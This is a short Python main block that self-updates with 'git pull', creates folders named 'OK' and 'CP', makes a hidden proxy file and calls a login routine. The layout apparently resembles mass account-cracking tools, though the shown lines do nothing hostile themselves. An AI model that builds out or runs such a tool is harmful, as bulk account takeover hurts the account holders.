if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	login()
